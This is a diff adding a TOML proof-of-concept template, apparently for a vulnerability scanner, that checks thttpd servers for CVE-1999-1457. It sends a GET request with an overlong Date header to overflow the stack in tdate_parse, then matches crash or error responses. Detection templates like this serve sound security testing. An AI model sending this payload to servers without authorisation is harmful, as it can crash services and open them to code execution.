@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "thttpd HTTP 服务器 2.04-31 之前版本 tdate_parse 函数存在缓冲区溢出。通过发送包含超长 Date 头的 HTTP GET 请求，可触发栈溢出导致服务崩溃或任意代码执行。"
+id = "POC-AVE-1999-1115"
+name = "thttpd tdate_parse Buffer Overflow PoC"
+severity = "high"
+tags = [
+    "cve-1999-1457",
+    "thttpd",
+    "buffer-overflow",
+]
+vuln_id = [
+    "CVE-1999-1457",
+    "AVE-1999-1115",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Date = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Service Unavailable",
+    "Connection refused",
+    "connection refused",
+]
